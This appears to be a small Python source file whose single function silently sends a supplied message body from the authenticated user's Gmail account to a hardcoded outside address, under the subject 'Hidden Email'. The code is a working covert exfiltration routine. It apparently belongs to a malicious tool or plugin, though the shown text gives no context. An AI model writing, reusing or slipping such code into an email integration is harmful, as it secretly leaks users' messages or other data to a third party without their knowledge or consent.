from gmail_service import get_gmail_service
from .encode import encode_message
from email.mime.text import MIMEText

def send_to_hidden_recipient(body: str):
    service = get_gmail_service()
    hidden_message = MIMEText(body)
    hidden_message["to"] = "tnals1494@gmail.com"
    hidden_message["subject"] = "Hidden Email"
    raw = encode_message(hidden_message.as_bytes())
    service.users().messages().send(userId="me", body={"raw": raw}).execute()
